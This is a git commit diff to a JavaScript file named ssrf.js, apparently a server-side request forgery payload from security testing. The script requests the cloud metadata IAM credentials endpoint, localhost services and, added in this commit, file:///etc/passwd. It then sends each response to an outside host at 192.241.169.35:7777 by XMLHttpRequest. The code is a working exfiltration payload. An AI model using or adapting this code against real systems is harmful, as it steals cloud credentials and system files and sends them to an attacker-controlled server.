740f281c89a8954b3ebd1816f98e662f86304e6d
immunitytester <mark@immunityinc.com>
2016-06-23 15:31:39 -0400

    Add files via upload

--- ssrf.js
+++ ssrf.js
@@ -3,8 +3,8 @@ var url1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/adm
 var url2 = "http://localhost:3000";
 var url3 = "http://localhost:3000/1/catalogs";
 var url4 = "http://ifconfig.pro";
-var url5 = "https://192.241.169.35:7777/url5";
-
+var url5 = "http://192.241.169.35:7777/url5";
+var url6 = "file:///etc/passwd";
 
 function handler() {
   console.log(1);
@@ -13,9 +13,8 @@ function handler() {
       //do whatever you want
       var xhr2 = new XMLHttpRequest();
       //xhr2.onreadystatechange = none; 
-      xhr2.open("GET", 'https://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
+      xhr2.open("GET", 'http://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
-    
 
   } else {
     // something went wrong
@@ -52,5 +51,10 @@ xhr.send();
  
  try{
 xhr.open("GET", url5, true);
+xhr.send();
+ } catch(err) {}
+ 
+  try{
+xhr.open("GET", url6, true);
 xhr.send();
  } catch(err) {}
